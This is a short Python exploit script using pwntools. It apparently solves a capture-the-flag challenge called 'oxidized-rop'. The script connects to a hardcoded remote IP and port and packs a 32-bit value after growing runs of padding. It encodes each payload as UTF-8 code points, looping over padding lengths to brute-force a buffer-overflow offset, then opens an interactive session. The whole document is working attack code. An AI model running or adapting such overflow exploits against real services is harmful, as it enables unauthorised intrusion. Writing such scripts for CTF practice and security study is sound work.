from pwn import *

context.log_level = 'debug'

def enc(string): # Construct a UTF-8 string that has our input as char points
	b = ""
	for c in string:
		b += (b"\\u04%2x" % c).replace(b" ", b"0").decode("unicode_escape")
		# Sorry!
	print(string, b)
	return b

ip, port = '134.122.104.91', 32475

payload = p32(123456)
#print(payload)

for i in range(1, 200-4+1, 1):
	s = b'A'*i + payload
	io = remote(ip, port)
	#io = process('./oxidized-rop')
	io.recvuntil(b'Selection:')
	io.sendline(b'1')
	io.recvuntil(b'Statement (max 200 characters):')
	io.sendline(enc(s))
	io.recvuntil(b'Selection:')
	io.sendline(b'2')
	io.interactive()
	io.close()

